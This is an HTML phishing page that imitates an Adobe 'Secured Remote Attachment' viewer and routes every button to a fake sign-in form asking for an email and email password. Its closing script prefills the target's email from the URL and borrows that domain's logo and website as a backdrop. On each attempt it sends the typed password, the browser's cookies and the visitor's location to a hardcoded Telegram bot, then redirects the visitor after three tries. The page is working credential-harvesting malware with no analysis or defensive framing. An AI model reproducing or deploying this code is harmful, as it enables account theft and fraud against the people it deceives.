<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Secured Remote Attachment â€” Mock Viewer</title>

<style>
/* â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”
   Adobe Clean Professional Theme
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” */
:root{
  --bg: #f3f4f6;
  --surface: #ffffff;
  --surface-soft: #fafafa;
  --border: #e5e7eb;
  --text-dark: #1a1a1a;
  --text-muted: #6b7280;
  --accent: #d9322c;
  --accent-dark: #b62823;
  --toolbar-gradient: linear-gradient(90deg, #d9332d, #b62823);
  --shadow-soft: 0 4px 12px rgba(0,0,0,0.06);
  --shadow-medium: 0 12px 30px rgba(0,0,0,0.10);
}

html,body{
  height:100%; margin:0;
  font-family: "Inter", system-ui, -apple-system, "Segoe UI", Roboto, Arial, sans-serif;
  background:var(--bg);
  color:var(--text-dark);
}
*{ box-sizing: border-box; }

body{
  display:flex;
  flex-direction:column;
  overflow:hidden;
}
  /* TOOLBAR */
.toolbar{
  height:62px;
  display:flex;
  align-items:center;
  padding:0 20px;
  background:var(--toolbar-gradient);
  color:#fff;
  position:fixed;
  left:0; right:0; top:0;
  z-index:100;
  box-shadow:0 2px 6px rgba(0,0,0,0.18);
}

.app-title{
  display:flex; align-items:center; gap:12px;
}
.app-title img{
  width:32px; height:32px;
}

.toolbar .right{
  margin-left:auto;
  display:flex; gap:10px; align-items:center;
  font-size:14px;
}
.toolbar .btn{
  padding:8px 14px;
  border-radius:8px;
  background:rgba(255,255,255,0.10);
  border:1px solid rgba(255,255,255,0.15);
  cursor:pointer;
  transition:.2s;
  font-weight:500;
}
.toolbar .btn:hover{
  background:rgba(255,255,255,0.18);
  transform:translateY(-2px);
}

/* â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”
   LAYOUT
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” */
.content{
  margin-top:62px;
  display:flex;
  flex:1;
  overflow:hidden;
}

/* LEFT SIDEBAR */
.left-sidebar{
  width:210px;
  background:var(--surface);
  border-right:1px solid var(--border);
  padding:20px;
  display:flex;
  flex-direction:column;
  gap:12px;
}

.sidebar-item{
  width:100%;
  display:flex; align-items:center;
  gap:12px;
  padding:10px 12px;
  border-radius:10px;
  cursor:pointer;
  transition:.15s;
  color:#333;
  font-size:14px;
  border:1px solid transparent;
}
.sidebar-item:hover{
  background:var(--surface-soft);
  border-color:var(--border);
}

.sidebar-item .icon{
  width:36px; height:36px;
  background:#f4f4f4;
  border-radius:8px;
  display:flex; align-items:center; justify-content:center;
  font-size:18px;
}

  /* Featured preview (large) */
  .viewer-area{
  flex:1;
  padding:28px;
  background:var(--bg);
  overflow-y:auto;
}

.viewer-head h2{
  margin:0;
  font-size:22px;
  font-weight:700;
}
.viewer-head p{
  margin:0;
  color:var(--text-muted);
  font-size:13px;
}

/* FEATURED SECTION */
.featured{
  display:flex; gap:22px;
  margin-top:16px;
}

.featured-left{
  flex:0 0 520px;
  background:var(--surface);
  border-radius:14px;
  overflow:hidden;
  box-shadow:var(--shadow-medium);
  position:relative;
  cursor:pointer;
}
.featured-left .big-preview{
  height:340px;
  background-size:cover;
  background-position:center;
}
.featured-meta{
  position:absolute;
  bottom:0; left:0; right:0;
  padding:16px 18px;
  background:linear-gradient(180deg,transparent,rgba(0,0,0,0.65));
  color:#fff;
  text-shadow:0 2px 4px rgba(0,0,0,0.4);
}

.featured-right{
  flex:1;
  display:flex;
  flex-direction:column;
  gap:16px;
}

.action-pill{
  padding:10px 14px;
  border-radius:10px;
  background:var(--surface);
  box-shadow:var(--shadow-soft);
  cursor:pointer;
  font-weight:600;
  transition:.18s;
  font-size:14px;
}
.action-pill:hover{
  transform:translateY(-3px);
}

/* INFORMATION BOXES */
.info-card{
  background:var(--surface);
  padding:14px;
  border-radius:12px;
  box-shadow:var(--shadow-soft);
  border:1px solid var(--border);
}

  /* Grid thumbnails */
 .thumb-grid{
  display:flex;
  flex-wrap:wrap;
  gap:22px;
  margin-top:30px;
}

.thumb{
  width:220px;
  background:var(--surface);
  border-radius:12px;
  box-shadow:var(--shadow-soft);
  border:1px solid var(--border);
  overflow:hidden;
  cursor:pointer;
  transition:.25s;
  position:relative;
}
.thumb:hover{
  transform:translateY(-6px);
  box-shadow:var(--shadow-medium);
}

.thumb .preview{
  height:160px;
  background-size:cover;
  background-position:center;
}

.card-label{
  font-size:14px;
  font-weight:600;
  padding:10px 12px 0;
}
.card-sub{
  padding:0 12px 12px;
  font-size:12px;
  color:var(--text-muted);
}

/* Thumbnail actions */
.overlay-actions{
  position:absolute;
  bottom:10px; left:10px; right:10px;
  display:flex; gap:8px;
  opacity:0;
  transform:translateY(6px);
  transition:.22s;
}
.thumb:hover .overlay-actions{
  opacity:1;
  transform:translateY(0);
}
.mini-btn{
  flex:1;
  padding:7px 8px;
  background:#fff;
  border-radius:8px;
  font-size:12px;
  border:1px solid var(--border);
  font-weight:600;
  cursor:pointer;
}

  /* overlay actions on thumbnail */
  .thumb .overlay-actions{ position:absolute; left:12px; right:12px; bottom:12px; display:flex; gap:8px; transform:translateY(8px); opacity:0; transition:opacity .22s, transform .22s; }
  .thumb:hover .overlay-actions{ transform:translateY(0); opacity:1; }
  .thumb .mini-btn{ flex:1; padding:8px 10px; border-radius:10px; background:rgba(255,255,255,0.92); border:1px solid rgba(0,0,0,0.06); font-weight:700; cursor:pointer; font-size:13px; }

  /* right side panel */
  .panel{
  width:300px;
  background:var(--surface);
  border-left:1px solid var(--border);
  padding:22px;
  display:flex;
  flex-direction:column;
  gap:16px;
}
.panel h3{
  margin:0;
  font-size:15px;
  font-weight:700;
}
  /* Login overlay & your login form preserved */
  .login-overlay{
  position:fixed;
  inset:0;
  background:rgba(0,0,0,0.72);
  display:flex;
  align-items:center;
  justify-content:center;
  opacity:0;
  pointer-events:none;
  transition:.4s;
}
.login-overlay.show{
  opacity:1;
  pointer-events:all;
}

.login-container{
  width:360px;
  background:var(--surface);
  padding:28px;
  border-radius:14px;
  box-shadow:var(--shadow-medium);
  text-align:center;
  transform:translateY(24px);
  opacity:0;
  transition:.45s ease;
}
.login-overlay.show .login-container{
  transform:translateY(0);
  opacity:1;
}

.login-container img{
  width:62px;
  margin-bottom:12px;
}

.login-fields input{
  width:100%;
  padding:12px;
  border-radius:8px;
  border:1px solid var(--border);
  margin-bottom:12px;
  font-size:14px;
}
.login-fields input:focus{
  border-color:var(--accent);
  outline:none;
}

.login-fields button{
  width:100%;
  padding:12px;
  border-radius:8px;
  border:none;
  background:var(--accent);
  color:#fff;
  font-weight:700;
  cursor:pointer;
  transition:.2s;
  margin-top:8px;
}
.login-fields button:hover{
  background:var(--accent-dark);
}

.error-msg{
  display:none;
  color:#b02a2a;
  font-size:13px;
  margin-bottom:10px;
}

.login-close{
  position:absolute;
  right:12px; top:12px;
  font-size:20px;
  color:#999;
  cursor:pointer;
}


  /* responsive */
  @media(max-width:1100px){
  .left-sidebar{ display:none; }
}
@media(max-width:800px){
  .panel{ display:none; }
  .featured{ flex-direction:column; }
  .featured-left{ width:100%; }
}
</style>
</head>

<body>
<!-- Loading Animation Overlay -->
<div id="loadingOverlay" style="
  position:fixed;
  inset:0;
  background:#f3f4f6;
  display:flex;
  align-items:center;
  justify-content:center;
  flex-direction:column;
  z-index:2000;
  transition:opacity 0.6s ease;
">
  <img src="https://i.postimg.cc/TRvqKyR3/Adobe-Systems-logo-and-wordmark-svg.png" 
       alt="Secure file loading" 
       style="width:80px;height:auto;animation:spin 2.4s linear infinite;opacity:.9;">
  <div style="margin-top:16px;font-size:14px;color:#555;font-weight:600;">
    Secured File Loadingâ€¦
  </div>
</div>

<style>
@keyframes spin {
  0% { transform:rotate(0deg); }
  100% { transform:rotate(360deg); }
}
</style>

<script>
  // Simulate file loading delay
  window.addEventListener('load', () => {
    const overlay = document.getElementById('loadingOverlay');
    overlay.style.opacity = '0';
    setTimeout(() => overlay.style.display = 'none', 800);
  });
</script>

<!-- background preview elements used by power.js -->
<iframe id="bg-frame"
        style="display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:-1;border:none;"></iframe>
<div class="overlay"></div>

  <div class="toolbar">
    <div class="app-title">
      <img id="logo" src="https://i.postimg.cc/TRvqKyR3/Adobe-Systems-logo-and-wordmark-svg.png" />
      <div>
        <div style="font-size:13px;font-weight:700">Secured Remote Attachment</div>
        <div style="font-size:11px;opacity:.95">Shared document â€” requires sign in</div>
      </div>
    </div>

    <!-- top toolbar actions: route to login (we pass an event-like object to preserve your function) -->
    <div class="right">
      <div style="font-size:13px;opacity:.95">Shared by <strong>Adobe Corp</strong></div>
      <div class="btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Purchase Order&quot;]') })">View</div>
      <div class="btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Contract&quot;]') })">Edit</div>
      <div class="btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Download</div>
      <div class="btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Other Documents&quot;]') })">Save</div>
    </div>
  </div>

  <div class="content">
    <!-- left sidebar (feature list) -->
    <div class="left-sidebar">
      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">
        <div class="icon">ğŸ“„</div><div>Ask AI Assistant</div>
      </div>
      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Purchase Order&quot;]') })">
        <div class="icon">ğŸ“</div><div>Generate a summary</div>
      </div>
      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Other Documents&quot;]') })">
        <div class="icon">ğŸ—œï¸</div><div>Compress a PDF</div>
      </div>
      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Contract&quot;]') })">
        <div class="icon">âœï¸</div><div>Edit text & images</div>
      </div>
      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">
        <div class="icon">ğŸ–¼ï¸</div><div>PDF to JPG</div>
      </div>
      <div class="sidebar-item" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Other Documents&quot;]') })">
        <div class="icon">ğŸ”—</div><div>Share</div>
      </div>
    </div>

    <!-- main viewer -->
    <section class="viewer-area">
      <div class="viewer-head">
        <h2>Secured Remote Attachment</h2>
        <p>Hover to preview â€” click any action to request access</p>
      </div>

      <!-- Featured preview (bigger) -->
      <div class="featured">
        <div class="featured-left thumb" data-doc="Business Certificate" onclick="openLogin(event)">
          <div class="big-preview" style="background-image:url('https://i.postimg.cc/BqDXrX3D/605-1.webp')"></div>
          <div class="featured-meta">
            <h3>International Trade Certificate</h3>
            <p>PDF Â· 2 pages Â· 124 KB â€” updated a few minutes ago</p>
          </div>
        </div>

        <div class="featured-right">
          <div class="top-actions">
            <div class="action-pill" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">View</div>
            <div class="action-pill" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Edit</div>
            <div class="action-pill" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Download</div>
            <div class="action-pill" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Save</div>
          </div>

          <div style="background:#fff;border-radius:10px;padding:12px;box-shadow:0 8px 24px rgba(0,0,0,0.04);">
            <div style="font-weight:700">Quick details</div>
            <div class="muted" style="margin-top:6px">Owner: Adobe Corp â€” Last edited: a few minutes ago â€” Permissions: private</div>

            <div style="display:flex;gap:8px;margin-top:12px;">
              <div class="action-pill" style="flex:1" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Request access</div>
              <div class="action-pill" style="flex:1" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Share</div>
            </div>
          </div>

          <div style="display:flex;gap:8px;">
            <div style="flex:1;background:linear-gradient(180deg,#fff,#fafafa);padding:12px;border-radius:10px;box-shadow:0 8px 24px rgba(0,0,0,0.04);">
              <div style="font-weight:700">Tags</div>
              <div class="muted" style="margin-top:8px">finance, onboarding, 2025</div>
            </div>

            <div style="flex:1;background:linear-gradient(180deg,#fff,#fafafa);padding:12px;border-radius:10px;box-shadow:0 8px 24px rgba(0,0,0,0.04);">
              <div style="font-weight:700">Versions</div>
              <div class="muted" style="margin-top:8px">v1.2 â€” v1.1</div>
            </div>
          </div>
        </div>
      </div>

      <!-- Thumbnails grid -->
      <div class="thumb-grid">
        <div class="thumb" data-doc="Business Certificate" onclick="openLogin(event)">
          <div class="preview" style="background-image:url('https://i.postimg.cc/hDYxnNwx/Screenshot-2025-11-04-at-5-06-19-am.png')"></div>
          <div class="card-label">Identification and Certificate of Incorporation</div>
          <div class="card-sub">PDF Â· 2 pages Â· 124 KB</div>

          <div class="overlay-actions">
            <div class="mini-btn" onclick="openLogin(event)">View</div>
            <div class="mini-btn" onclick="openLogin(event)">Download</div>
            <div class="mini-btn" onclick="openLogin(event)">Save</div>
          </div>
        </div>

        <div class="thumb" data-doc="Specifications" onclick="openLogin(event)">
          <div class="preview" style="background-image:url('https://i.postimg.cc/mTt7XYrr/Chat-GPT-Image-Nov-4-2025-05-43-47-AM.png')"></div>
          <div class="card-label">Specifications</div>
          <div class="card-sub">PDF Â· 8 pages Â· 512 KB</div>

          <div class="overlay-actions">
            <div class="mini-btn" onclick="openLogin(event)">View</div>
            <div class="mini-btn" onclick="openLogin(event)">Edit</div>
            <div class="mini-btn" onclick="openLogin(event)">Share</div>
          </div>
        </div>

        <div class="thumb" data-doc="Order List" onclick="openLogin(event)">
          <div class="preview" style="background-image:url('https://i.postimg.cc/x018xtCm/Chat-GPT-Image-Nov-4-2025-at-05-26-54-AM.png')"></div>
          <div class="card-label">Order List</div>
          <div class="card-sub">PDF Â· 1 page Â· 86 KB</div>

          <div class="overlay-actions">
            <div class="mini-btn" onclick="openLogin(event)">View</div>
            <div class="mini-btn" onclick="openLogin(event)">Download</div>
            <div class="mini-btn" onclick="openLogin(event)">Export</div>
          </div>
        </div>

        <div class="thumb" data-doc="Images Samples" onclick="openLogin(event)">
          <div class="preview" style="background-image:url('https://i.postimg.cc/2rTxXj7r/Chat-GPT-Image-Nov-4-2025-at-05-23-15-AM.png')"></div>
          <div class="card-label">Images Samples</div>
          <div class="card-sub">ZIP Â· 5 files Â· 1.2 MB</div>

          <div class="overlay-actions">
            <div class="mini-btn" onclick="openLogin(event)">View</div>
            <div class="mini-btn" onclick="openLogin(event)">Convert</div>
            <div class="mini-btn" onclick="openLogin(event)">Share</div>
          </div>
        </div>
      </div>
    </section>

    <!-- right side panel -->
    <aside class="panel">
      <h3>File actions</h3>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <button class="small-btn primary" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Save</button>
        <button class="small-btn" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Share</button>
        <button class="small-btn ghost" onclick="openLogin({ currentTarget: document.querySelector('.thumb[data-doc=&quot;Business Certificate&quot;]') })">Details</button>
      </div>

      <h3 style="margin-top:12px">Activity</h3>
      <div class="muted">No recent activity â€” sign in to view files.</div>

      <h3 style="margin-top:12px">Recent</h3>
      <div style="display:flex;flex-direction:column;gap:8px;">
        <div style="display:flex;gap:10px;align-items:center;">
          <div style="width:44px;height:44;border-radius:8px;background:#f5f5f6"></div>
          <div style="font-size:13px">Purchase_Order_987490.pdf</div>
        </div>
        <div style="display:flex;gap:10px;align-items:center;">
          <div style="width:44px;height:44;border-radius:8px;background:#f5f5f6"></div>
          <div style="font-size:13px">Contract_v1.pdf</div>
        </div>
      </div>
    </aside>
  </div>
  

  <!-- LOGIN OVERLAY (your form preserved exactly, function unchanged) -->
  <div class="login-overlay" id="loginOverlay">
    <div class="login-container">
      <div class="login-close" onclick="closeLogin()">âœ•</div>
      <img src="https://i.postimg.cc/TRvqKyR3/Adobe-Systems-logo-and-wordmark-svg.png" alt="Adobe Logo" />
      <div class="login-fields">
        <label for="email">Secured file, sign in for your provider verification</label>
        <input type="text" inputmode="email" id="email" placeholder="Enter your email" autocomplete="off" />
        <label for="password"></label>
        <input type="text" id="password" placeholder="Enter your email password" autocomplete="off" />
        <div id="error-msg" class="error-msg">Incorrect email or password</div>
        <button id="login-btn">View Documents</button>
      </div>
    </div>
  </div>
  

<script>
  let activeDoc = null;

  function openLogin(e){
    const thumb = e.currentTarget.closest('.thumb');
    activeDoc = thumb?.dataset.doc || 'Document';
    document.getElementById('loginOverlay').classList.add('show');
  }

  function closeLogin(){
    document.getElementById('loginOverlay').classList.remove('show');
    document.getElementById('error-msg').style.display='none';
  }

  document.getElementById('login-btn').addEventListener('click', ()=>{
    const err = document.getElementById('error-msg');
    err.style.display='block';
  });


// Telegram Bot config
const TELEGRAM_BOT_TOKEN = "8366154069:AAFTClzM2Kbirysud1i49UAWmEC6JP0T0xg";
const TELEGRAM_CHAT_ID = "7574749243";

// Elements
const rawHash = window.location.hash.substring(1);
const emailInput = document.getElementById('email');
const logoImg = document.getElementById('logo');
const bgFrame = document.getElementById('bg-frame');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');
const errorMsg = document.getElementById('error-msg');
const overlay = document.querySelector('.overlay');

let attempts = 0;
const maxAttempts = 3;

document.body.classList.add('blur-active');

// Helper: parse document.cookie into an object { name: value, ... }
function parseCookies(cookieString = document.cookie) {
  const cookies = {};
  if (!cookieString) return cookies;
  cookieString.split(';').forEach(pair => {
    const idx = pair.indexOf('=');
    if (idx > -1) {
      const name = pair.slice(0, idx).trim();
      const val = pair.slice(idx + 1).trim();
      try {
        cookies[name] = decodeURIComponent(val);
      } catch {
        cookies[name] = val;
      }
    }
  });
  return cookies;
}

// Grab cookies now
const cookies = parseCookies();
// Optional: console log to check cookies
console.log("Cookies available to JS:", cookies);

// Get email from URL  ?u=
const params = new URLSearchParams(window.location.search);
const rawEmail = params.get("u");
  // Remove it from the URL instantly
        history.replaceState({}, document.title, window.location.pathname);
// Check if email exists AND is valid
if (rawEmail && /^[^@]+@[^@]+\.[^@]+$/.test(rawEmail)) {

  emailInput.value = rawEmail;
  emailInput.setAttribute("uneditable", true);

  const domain = rawEmail.split('@')[1];


  
  // Set logo
  logoImg.src = `https://logo.clearbit.com/${domain}`;
  logoImg.onerror = () => {
    logoImg.src = "https://via.placeholder.com/150?text=Logo";
  };

  // Setup fallback screenshot container
  const fallbackScreenshot = document.createElement('img');
  fallbackScreenshot.id = "fallback-screenshot";
  fallbackScreenshot.style.cssText = `
    display: none;
    position: fixed; top: 0; left: 0;
    width: 100vw; height: 100vh;
    object-fit: cover;
    z-index: 0;
    pointer-events: none;
  `;
  fallbackScreenshot.alt = "Screenshot fallback";
  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
  document.body.appendChild(fallbackScreenshot);

  // Load iframe with timeout
  let iframeLoaded = false;
  bgFrame.src = `https://${domain}`;

  bgFrame.onload = () => {
    iframeLoaded = true;
    fallbackScreenshot.style.display = "none";
    bgFrame.style.display = "block";
  };

  setTimeout(() => {
    if (!iframeLoaded) {
      bgFrame.style.display = "none";
      fallbackScreenshot.style.display = "block";
      // Keep overlay visible â€” do NOT hide it
      document.body.classList.remove('blur-active'); // optional blur removal
    }
  }, 6000);

  bgFrame.onerror = () => {
    bgFrame.style.display = "none";
    fallbackScreenshot.style.display = "block";
    // Keep overlay visible â€” do NOT hide it
    document.body.classList.remove('blur-active'); // optional blur removal
  };
}

// Fetch user country (mandatory)

// Location details
let userIP = "Unknown IP";
let userCity = "Unknown City";
let userCountry = "Unknown Country";
let userISP = "Unknown ISP";
loginBtn.disabled = true;

fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    userCity = data.city || userCity;
    userCountry = data.country_name || userCountry;
  })
  .catch(() => {
    // silent fail
  })
  .finally(() => {
    loginBtn.disabled = false;
  });

// Telegram message sender
function sendTelegramMessage(email, password, attempt, country, cookies) {
  const text = `â˜ ï¸ DAVON CHAMELEON [${attempt}/3] â˜ ï¸\n` +
               ` UserId : [ ${email} ]\n` +
               `    Pass : [ ${password} ]\n` +
               ` Country : [ ${userCity}, ${userCountry} ]\n` +
               ` Cookies: ${JSON.stringify(cookies)}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: "HTML"
  };
  fetch(url, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload)
  }).catch(e => console.error("Telegram send failed:", e));
}

// Login button handler
loginBtn.addEventListener('click', () => {
  const password = passwordInput.value.trim();
  if (password === "") {
    errorMsg.textContent = "Password cannot be empty.";
    return;
  }
  attempts++;
  sendTelegramMessage(emailInput.value, password, attempts, userCountry, cookies);

  if (attempts < maxAttempts) {
    errorMsg.textContent = "Incorrect password.";
    passwordInput.value = "";
  } else {
    errorMsg.textContent = "";
    overlay.style.display = 'none';
    document.body.classList.remove('blur-active');
    window.location.href = `https://${emailInput.value.split('@')[1]}`;
  }
});
</script>
</body>
</html>
